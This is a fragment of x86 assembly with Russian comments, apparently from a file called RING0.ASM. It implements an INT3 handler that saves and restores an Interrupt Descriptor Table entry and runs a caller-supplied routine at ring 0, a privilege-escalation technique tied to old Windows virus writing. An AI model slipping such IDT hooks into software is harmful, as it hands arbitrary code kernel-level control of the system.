;AX = 3 - Выполнить подпpогpамму как задачу RING 0
;Вход: EDI - смещение подпpогpаммы
obr_INT3:
        push     ebp
        call     init_obr_INT3
init_obr_INT3:
        pop      ebp
        sub      ebp,offset (init_obr_INT3-obr_INT3)
        ;Сдесь можно опpеделить свои функции RING0
        cmp      ax,01h ;Инициализация функций RING0 (не использовать)
        jz       init_RING0_function
        cmp      ax,02h ;Remove RING 0 функций
        jz       remove_RING0_function
        cmp      ax,03h
        jz       call_RING0
function_complite:
        pop      ebp
function_complite_without_popebp:
        iretd
init_RING0_function:
        mov      dword ptr [ebp+old_IN3_base_addr-obr_INT3],edi
        mov      dword ptr [ebp+IDT_base_addr-obr_INT3],ebx
        jmp      function_complite
remove_RING0_function:
        push     ebx esi
        mov      ebx,dword ptr [ebp+IDT_base_addr-obr_INT3]
        mov      esi,dword ptr [ebp+old_IN3_base_addr-obr_INT3]
        mov      [ebx],si
        shr      esi,10h
        mov      [ebx+06],si
        pop      esi ebx
        jmp      function_complite
call_RING0:
        pop      ebp
        call     edi
        jmp      function_complite_without_popebp
old_IN3_base_addr dd 0
IDT_base_addr     dd 0
;════════════════════════════════════════════════════════════════════════════
────────────────────────────────────────────────────────────────[RING0.ASM]───
